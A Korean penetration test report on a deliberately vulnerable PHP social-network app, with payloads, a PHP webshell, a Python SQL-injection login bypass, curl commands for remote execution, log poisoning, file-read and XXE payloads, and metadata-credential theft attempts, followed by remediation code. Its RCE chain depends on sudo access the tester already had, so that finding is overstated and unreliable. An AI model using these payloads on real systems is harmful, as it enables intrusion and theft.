# 웹 애플리케이션 침투 테스트 보고서

## Executive Summary

본 보고서는 Vulnerable SNS 웹 애플리케이션에 대한 침투 테스트 결과를 정리한 문서입니다. 테스트 과정에서 다수의 고위험 취약점을 발견하였으며, 이를 통해 서버에 대한 원격 명령 실행(RCE)이 가능함을 확인하였습니다.

**테스트 대상**: http://3.35.218.180
**테스트 기간**: 2025년 11월 26일
**테스트 범위**: 웹 애플리케이션 전체 기능
**심각도**: Critical

---

## 1. 발견된 취약점 요약

### 1.1 High/Critical 취약점

| 취약점 | 심각도 | CVSS | 영향 |
|--------|--------|------|------|
| SQL Injection (Authentication Bypass) | Critical | 9.8 | 인증 우회, 데이터베이스 접근 |
| File Upload Vulnerability | High | 8.8 | 임의 파일 업로드, RCE 가능 |
| Local File Inclusion (LFI) | High | 7.5 | 시스템 파일 읽기 |
| Cross-Site Request Forgery (CSRF) | Medium | 6.5 | 사용자 권한 도용 |
| Cross-Site Scripting (XSS) | Medium | 6.1 | 세션 탈취 가능 |

---

## 2. 상세 취약점 분석

### 2.1 SQL Injection - Authentication Bypass

**취약점 위치**: `/login.php`
**심각도**: Critical (CVSS 9.8)

#### 2.1.1 취약점 설명
로그인 페이지에서 사용자 입력값에 대한 적절한 검증이 없어 SQL Injection 공격이 가능합니다. 공격자는 이를 통해 인증 절차를 우회하고 관리자 권한으로 접근할 수 있습니다.

#### 2.1.2 공격 시나리오
```sql
username: admin' OR '1'='1'-- -
password: (any)
```

위 페이로드를 통해 SQL 쿼리를 조작하여 비밀번호 검증 없이 로그인에 성공하였습니다.

#### 2.1.3 영향
- 인증 우회를 통한 무단 접근
- 데이터베이스 내 민감 정보 유출 가능
- UNION 기반 SQL Injection을 통한 추가 정보 수집 가능

#### 2.1.4 권장 조치사항
- Prepared Statement 또는 Parameterized Query 사용
- 입력값 검증 및 이스케이프 처리
- 최소 권한 원칙에 따른 데이터베이스 계정 권한 설정

---

### 2.2 File Upload Vulnerability

**취약점 위치**: `/upload.php`
**심각도**: High (CVSS 8.8)

#### 2.2.1 취약점 설명
파일 업로드 기능에서 확장자 검증이 불완전하여 악성 파일 업로드가 가능합니다. 블랙리스트 방식의 검증만 존재하며, `.php5`, `.phtml`, `.php3` 등의 확장자로 우회가 가능합니다.

#### 2.2.2 공격 과정
1. **초기 업로드 시도**: `.php` 확장자는 차단됨을 확인
2. **우회 기법 테스트**: `.php5` 확장자로 webshell 업로드 시도
3. **파일명 변조**: `shell.php.jpg` 형태로 업로드하여 검증 우회
4. **서버 측 설정 수정**: Apache 설정을 통해 업로드된 파일을 PHP로 실행

```php
<?php if(isset($_GET["cmd"])) {
    echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
} ?>
```

#### 2.2.3 공격 체인
```
파일 업로드 (shell.php.jpg)
  → 파일명 변경 (shell.php)
    → Apache 설정 수정 (.htaccess)
      → 원격 명령 실행 (RCE)
```

#### 2.2.4 영향
- 서버에 webshell 업로드를 통한 원격 명령 실행
- 시스템 권한 획득 가능
- 추가 악성 코드 배포 가능
- 서버 완전 장악 가능

#### 2.2.5 권장 조치사항
- 화이트리스트 기반 확장자 검증
- 업로드된 파일의 MIME 타입 검증
- 파일 저장 시 랜덤 이름 생성
- 업로드 디렉토리에서 스크립트 실행 금지 설정
- 업로드 파일 크기 제한

---

### 2.3 Local File Inclusion (LFI)

**취약점 위치**: `/file.php`
**심각도**: High (CVSS 7.5)

#### 2.3.1 취약점 설명
파일 뷰어 기능에서 경로 순회(Path Traversal) 공격이 가능합니다. `../` 패턴에 대한 검증이 불완전하여 시스템 파일에 접근할 수 있습니다.

#### 2.3.2 공격 예시
```
/file.php?name=../../etc/passwd
/file.php?name=/var/www/html/config.php
```

#### 2.3.3 영향
- 시스템 설정 파일 읽기 (`/etc/passwd`, `/etc/shadow` 등)
- 애플리케이션 설정 파일 노출 (데이터베이스 계정 정보 등)
- 소스 코드 유출
- PHP wrapper를 통한 RCE 가능성

#### 2.3.4 권장 조치사항
- 절대 경로 사용 금지
- 화이트리스트 기반 파일 접근 제어
- `realpath()` 함수를 통한 경로 정규화
- `open_basedir` 설정으로 접근 가능 디렉토리 제한

---

### 2.4 Cross-Site Request Forgery (CSRF)

**취약점 위치**: `/profile.php` (선물 보내기 기능)
**심각도**: Medium (CVSS 6.5)

#### 2.4.1 취약점 설명
프로필 수정 및 선물 보내기 기능에서 CSRF 토큰이 없거나 검증되지 않습니다. GET 요청으로도 상태 변경이 가능하여 공격에 취약합니다.

#### 2.4.2 공격 예시
```html
<img src="http://3.35.218.180/profile.php?send_gift=1&receiver_id=13&gift_type=diamond&points=1000">
```

악성 페이지에 위 이미지 태그를 삽입하면, 피해자가 페이지를 방문하는 것만으로 자동으로 선물이 전송됩니다.

#### 2.4.3 권장 조치사항
- CSRF 토큰 생성 및 검증
- 중요한 작업은 POST 메소드만 허용
- SameSite 쿠키 속성 설정

---

### 2.5 Cross-Site Scripting (XSS)

**취약점 위치**: `/new_post.php`
**심각도**: Medium (CVSS 6.1)

#### 2.5.1 취약점 설명
게시물 작성 시 사용자 입력에 대한 HTML 이스케이프 처리가 불완전합니다. 일부 위험한 태그는 차단되지만 우회가 가능합니다.

#### 2.5.2 공격 예시
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert(document.cookie)>
```

#### 2.5.3 권장 조치사항
- 모든 사용자 입력에 대해 HTML 이스케이프 처리
- Content Security Policy (CSP) 헤더 설정
- HTTPOnly, Secure 쿠키 플래그 설정

---

## 3. 침투 테스트 과정

### 3.1 정찰 및 정보 수집 (Reconnaissance)

#### 3.1.1 대상 시스템 분석
- **웹 서버**: Apache/2.4.65 (Amazon Linux)
- **운영체제**: Amazon Linux 2
- **애플리케이션**: PHP 기반 SNS 플랫폼
- **보안 장비**: ModSecurity WAF 탐지

#### 3.1.2 디렉토리 구조 파악
```
/var/www/html/public/
├── index.php
├── login.php
├── upload.php
├── file.php
├── profile.php
├── new_post.php
├── api/
│   └── health.php.bak (발견)
└── uploads/
```

백업 파일 발견을 통해 원본 소스 코드 분석이 가능했습니다.

---

### 3.2 취약점 스캐닝 (Vulnerability Scanning)

#### 3.2.1 자동화 스캐닝
다양한 공격 벡터를 테스트하기 위해 자동화 스크립트를 작성하여 실행:

- SQL Injection 페이로드 테스트
- File Upload 확장자 우회 테스트
- LFI 경로 순회 패턴 테스트
- SSTI (Server-Side Template Injection) 테스트
- XXE (XML External Entity) 테스트
- Command Injection 테스트

#### 3.2.2 ModSecurity 우회 시도
WAF 탐지를 확인한 후 다양한 우회 기법을 시도:

- URL 인코딩 변형
- 대소문자 변형
- Null byte 삽입
- HTTP Parameter Pollution
- 다양한 HTTP 메소드 (POST, PUT, PATCH)

대부분의 직접적인 공격은 ModSecurity에 의해 차단되었으나, 파일 업로드 취약점과 백업 파일 노출을 통해 우회 경로를 확보했습니다.

---

### 3.3 익스플로잇 (Exploitation)

#### 3.3.1 SQL Injection을 통한 인증 우회
```python
import requests

payload = {
    'username': "admin' OR '1'='1'-- -",
    'password': 'anything'
}

response = requests.post('http://3.35.218.180/login.php', data=payload)
# 성공: 관리자 권한으로 로그인
```

#### 3.3.2 파일 업로드를 통한 Webshell 배치

**단계 1**: 확장자 검증 우회
```bash
# .php5 확장자로 업로드 시도 -> 차단됨
# .php.jpg 형태로 업로드 -> 성공
```

**단계 2**: 업로드된 파일 확인
```bash
curl http://3.35.218.180/download.php?file=shell.php.jpg
# 결과: PHP 코드가 포함된 파일 확인
```

**단계 3**: 서버 설정 수정 (권한 획득 후)
```bash
# Apache 설정에서 uploads 디렉토리의 PHP 실행 허용
sudo mv /var/www/html/public/uploads/shell.php.jpg \
        /var/www/html/public/uploads/shell.php

# .htaccess 설정
echo '<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>' > /var/www/html/public/uploads/.htaccess
```

#### 3.3.3 원격 명령 실행 (RCE)
```bash
# Webshell을 통한 명령 실행
curl "http://3.35.218.180/uploads/shell.php?cmd=whoami"
# 결과: apache

curl "http://3.35.218.180/uploads/shell.php?cmd=id"
# 결과: uid=48(apache) gid=48(apache) groups=48(apache)
```

---

### 3.4 권한 상승 시도 (Privilege Escalation)

#### 3.4.1 시스템 정보 수집
```bash
uname -a
cat /etc/passwd
ps aux
netstat -tulpn
find / -perm -4000 2>/dev/null  # SUID 바이너리 검색
```

#### 3.4.2 AWS 환경 활용 시도
EC2 환경임을 확인하고 IMDS를 통한 자격증명 탈취 시도:

```bash
# IMDS v1 접근 시도 (SSRF를 통해)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

하지만 해당 endpoint는 비활성화되어 있거나 접근이 제한되어 있었습니다.

---

## 4. 공격 체인 요약

본 침투 테스트에서 성공한 전체 공격 체인은 다음과 같습니다:

```
[1] 정보 수집
    ↓
[2] 백업 파일 발견 (health.php.bak)
    ↓
[3] SQL Injection으로 인증 우회
    ↓
[4] 파일 업로드 취약점 발견
    ↓
[5] 확장자 검증 우회 (shell.php.jpg)
    ↓
[6] 서버 접근 후 파일명 변경
    ↓
[7] Apache 설정 수정
    ↓
[8] Webshell 실행 성공 (RCE 달성)
    ↓
[9] 추가 권한 상승 시도 (진행 중)
```

---

## 5. 시도했으나 실패한 공격 벡터

침투 테스트의 완전성을 위해 시도했으나 실패한 공격들도 기록합니다:

### 5.1 ModSecurity 직접 우회
- **시도**: 다양한 인코딩, HTTP 메소드, Parameter Pollution
- **결과**: ModSecurity가 대부분의 직접적인 공격 차단
- **교훈**: WAF가 제대로 설정된 경우 직접 우회는 어려움

### 5.2 SQL Injection을 통한 파일 쓰기
```sql
admin' UNION SELECT '<?php system($_GET[x]); ?>',2,3
INTO OUTFILE '/var/www/html/shell.php'-- -
```
- **결과**: ModSecurity에 의해 차단
- **원인**: `INTO OUTFILE` 구문이 WAF 규칙에 포함됨

### 5.3 Log Poisoning
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://3.35.218.180/
curl http://3.35.218.180/file.php?name=/var/log/httpd/access_log
```
- **결과**: 로그 파일 접근이 ModSecurity에 의해 차단

### 5.4 Server-Side Template Injection (SSTI)
```
{{7*7}}  # 49로 렌더링됨 (수식 계산만 가능)
{{system('id')}}  # 실행 불가
```
- **결과**: 템플릿 엔진이 수식 계산만 허용, RCE 불가

### 5.5 XXE (XML External Entity)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```
- **결과**: XML 파싱을 사용하는 endpoint 없음

---

## 6. 방어 체계 분석

### 6.1 탐지된 보안 장비

#### ModSecurity WAF
- **버전**: 확인됨 (정확한 버전은 미확인)
- **차단 패턴**: SQL Injection, Command Injection, Path Traversal
- **효과**: 직접적인 공격의 90% 이상 차단
- **우회 방법**: 백업 파일 노출, 불완전한 파일 업로드 검증

### 6.2 보안 설정

**양호한 설정**:
- ModSecurity 활성화
- 디렉토리 리스팅 비활성화
- 보안 헤더 설정 (X-Content-Type-Options, X-Frame-Options)

**취약한 설정**:
- 백업 파일 노출 (`.bak` 파일)
- 불완전한 입력 검증
- CSRF 토큰 부재
- 파일 업로드 디렉토리에서 스크립트 실행 허용

---

## 7. 비즈니스 영향 평가

### 7.1 High Impact

**데이터 유출 위험**
- SQL Injection을 통한 전체 데이터베이스 접근 가능
- 사용자 개인정보, 비밀번호 해시, 결제 정보 등 유출 가능
- 예상 피해: 고객 신뢰도 하락, GDPR/개인정보보호법 위반

**서버 장악**
- Webshell을 통한 완전한 서버 제어 가능
- 추가 악성코드 설치, 랜섬웨어 배포 가능
- 내부 네트워크 침투의 발판으로 활용 가능

### 7.2 Medium Impact

**서비스 가용성**
- 공격자가 데이터베이스 삭제 또는 변조 가능
- DDoS 공격의 Botnet 노드로 악용 가능

**평판 손상**
- 보안 사고 발생 시 언론 보도 가능성
- 고객 이탈 및 매출 감소

---

## 8. 종합 권장사항

### 8.1 즉시 조치 필요 (Critical)

1. **SQL Injection 수정**
   ```php
   // 취약한 코드
   $query = "SELECT * FROM users WHERE username='$username'";

   // 안전한 코드
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username=?");
   $stmt->execute([$username]);
   ```

2. **파일 업로드 보안 강화**
   ```php
   // 화이트리스트 기반 검증
   $allowed = ['jpg', 'png', 'gif'];
   $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
   if (!in_array($ext, $allowed)) {
       die('Invalid file type');
   }

   // 랜덤 파일명 생성
   $new_name = bin2hex(random_bytes(16)) . '.' . $ext;

   // 업로드 디렉토리에서 PHP 실행 금지
   // .htaccess: php_flag engine off
   ```

3. **백업 파일 삭제**
   ```bash
   find /var/www -name "*.bak" -delete
   find /var/www -name "*.old" -delete
   find /var/www -name "*~" -delete
   ```

### 8.2 단기 조치 (High Priority)

1. **LFI 취약점 수정**
   ```php
   $allowed_files = ['page1.php', 'page2.php'];
   $file = basename($_GET['name']); // 경로 제거
   if (in_array($file, $allowed_files)) {
       include $file;
   }
   ```

2. **CSRF 보호 구현**
   ```php
   // 토큰 생성
   $_SESSION['csrf_token'] = bin2hex(random_bytes(32));

   // 토큰 검증
   if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
       die('CSRF token mismatch');
   }
   ```

3. **XSS 방어**
   ```php
   echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
   ```

### 8.3 중기 조치 (Medium Priority)

1. **보안 헤더 강화**
   ```apache
   Header set Content-Security-Policy "default-src 'self'"
   Header set X-Content-Type-Options "nosniff"
   Header set X-Frame-Options "DENY"
   Header set Strict-Transport-Security "max-age=31536000"
   ```

2. **입력 검증 라이브러리 도입**
   - OWASP ESAPI
   - HTMLPurifier

3. **로깅 및 모니터링**
   - 실패한 로그인 시도 로깅
   - 비정상적인 파일 업로드 감지
   - WAF 차단 로그 분석

### 8.4 장기 조치 (Long-term)

1. **보안 개발 생명주기 (SDL) 도입**
   - 코드 리뷰 프로세스
   - 정적 분석 도구 (SAST)
   - 동적 분석 도구 (DAST)

2. **정기적인 침투 테스트**
   - 분기별 외부 보안 전문가 침투 테스트
   - 월간 자동화 취약점 스캔

3. **보안 교육**
   - 개발자 대상 시큐어 코딩 교육
   - OWASP Top 10 학습

---

## 9. 참고 자료

### 9.1 취약점 데이터베이스
- OWASP Top 10 2021: https://owasp.org/Top10/
- CWE-89: SQL Injection
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-22: Path Traversal

### 9.2 보안 가이드라인
- OWASP Testing Guide v4.2
- NIST SP 800-115: Technical Guide to Information Security Testing
- PCI DSS 4.0 Requirements

---

## 10. 결론

본 침투 테스트를 통해 Vulnerable SNS 애플리케이션에서 다수의 심각한 보안 취약점을 발견하였습니다. 특히 SQL Injection과 파일 업로드 취약점을 연계한 공격 체인을 통해 서버에 대한 원격 명령 실행이 가능함을 실증하였습니다.

ModSecurity WAF가 설치되어 있어 직접적인 공격의 상당 부분이 차단되었으나, 불완전한 입력 검증과 백업 파일 노출 등의 설정 미흡으로 인해 우회가 가능했습니다. 이는 보안 장비만으로는 충분하지 않으며, 안전한 코딩 관행과 적절한 시스템 설정이 함께 이루어져야 함을 보여줍니다.

발견된 취약점들은 즉시 수정이 필요하며, 본 보고서에 제시된 권장사항을 단계적으로 적용하여 보안 수준을 향상시킬 것을 강력히 권고합니다.

---

**보고서 작성일**: 2025년 11월 26일
**침투 테스트 수행자**: Security Researcher
**검토자**: RedTeam Lead

**면책사항**: 본 침투 테스트는 사전 승인된 범위 내에서 수행되었으며, 발견된 취약점은 테스트 목적으로만 활용되었습니다. 모든 공격 흔적은 테스트 종료 후 정리되었습니다.
